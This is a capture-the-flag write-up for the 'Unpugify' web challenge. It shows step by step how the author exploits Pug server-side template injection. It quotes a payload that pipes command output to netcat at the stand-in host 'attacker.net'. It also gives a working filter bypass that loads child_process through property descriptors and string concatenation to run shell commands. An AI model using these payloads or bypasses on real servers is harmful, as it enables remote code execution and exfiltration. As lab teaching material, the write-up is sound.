## Challenge: Web/Unpugify 480 points - 45 solves

Web interfaces:


![image](https://user-images.githubusercontent.com/50044415/133916354-50d31797-ff25-4136-9e98-d35e25dbf767.png)


After fuzzing, i found endpoint /package.json

![image](https://user-images.githubusercontent.com/50044415/133916371-aeda4c77-bc25-425f-bdeb-7f3483a8d4c5.png)


The web application is using a package name pug-code-gen that's suspicous to me. So i searched about it and found this:https://github.com/pugjs/pug/issues/3312

![image](https://user-images.githubusercontent.com/50044415/133916392-beb64ee7-c113-4d18-aaf7-c41c8214afef.png)


So we can RCE with pretty parameter if we can modify it
Let try catching the request with Burp Suite

![image](https://user-images.githubusercontent.com/50044415/133916419-181d88f2-9448-4a44-86b6-5401fa26c26a.png)


So we can control pretty. Then i use the payload from the issue page to try RCE

```
pretty=');process.mainModule.constructor._load('child_process').exec('whoami');_=('
```

It didn't work, so this maybe a rabbit hole.

Then i realised that we could modify Pug code and the server will render it, so maybe a SSTI here

![image](https://user-images.githubusercontent.com/50044415/133916462-1cc85474-ef44-4eac-8d3f-a9d669136776.png)

So it worked, there is a SSTI vuln.
I found this article about exploiting Pug SSTI: https://portswigger.net/research/server-side-template-injection
The payload: 
```
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

But 'root', 'process', 'mainModule', 'require', 'child_process' and 'exec' are all blocked, so we have to find a way to bypass them

root is the global object in JS so we can call it with 'this'

```
- var x = this
```

To access process, we can use built-in function from JS Object.getOwnPropertyDescriptor()

```
- var x = Object.getOwnPropertyDescriptor(this, "pro"+"cess").get()
```

Access to mainModule is similar
```
- var x = Object.getOwnPropertyDescriptor(this, "pro"+"cess").get()
- var y = Object.getOwnPropertyDescriptor(x, "pro"+"cess").value
```

But seems like the code for Pug is updated so we can't find require from mainModule, so i dumped mainModuled code to find a good way to break in.

```
- var x = Object.getOwnPropertyDescriptor(this, "pro"+"cess").get()
- var y = Object.getOwnPropertyDescriptor(x, "main"+"Module").value
each val in y
  <br>
  <br>
  <br>
  
  = val
```

Here is what we got

![image](https://user-images.githubusercontent.com/50044415/133916602-6e9323cf-df9e-4bba-8373-39c58ce08a61.png)


There is function that looks interesting:
```
function(id) {
  validateString(id, 'id');
  if (id === '') {
    throw new ERR_INVALID_ARG_VALUE('id', id,
                                    'must be a non-empty string');
  }
  requireDepth++;
  try {
    return Module._load(id, this, /* isMain */ false);
  } finally {
    requireDepth--;
  }
}
```

So call this function with id and it will load a module. Sounds like our "require"

```
- var x = Object.getOwnPropertyDescriptor(this, "pro"+"cess").get()
- var y = Object.getOwnPropertyDescriptor(x, "main"+"Module").value
each val in y
  if (""+val).startsWith("function(id)")
    - var z = val("chil"+"d_pro"+"cess")
    - var t = Object.getOwnPropertyDescriptor(z, "exe"+"cSync").value
    = t("cat flag.txt")
```
![image](https://user-images.githubusercontent.com/50044415/133916724-b66711b9-913b-480a-ae60-a9be84bcf1d7.png)

Then we got the flag

## Cre: psycholog1st





































